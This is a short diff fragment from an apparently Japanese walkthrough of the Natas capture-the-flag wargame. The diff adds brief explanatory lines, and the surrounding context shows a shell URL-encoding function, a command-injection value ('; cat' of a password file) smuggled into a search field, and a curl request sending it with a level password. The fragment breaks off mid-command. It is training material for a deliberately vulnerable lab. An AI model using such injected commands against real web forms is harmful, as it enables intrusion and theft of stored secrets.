@@ -76,13 +76,14 @@ function urlencode {
   echo "$1" | nkf -WwMQ | sed 's/=$//g' | tr = % | tr -d '\n'
 }
 ```
-
+urlencodeを使ってパスをエンコードします。
 ```
 $ urlencode "; cat /etc/natas\_webpass/natas9"
 ```
 ```
 %3B%20cat%20%2Fetc%2Fnatas%5C%5Fwebpass%2Fnatas9
 ```
+上で得たURLを使います。
 ```
 $ curl -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
        -d "needle=%3B%20cat%20%2Fetc%2Fnatas%5C%5Fwebpass%2Fnatas9&submit=Search" \
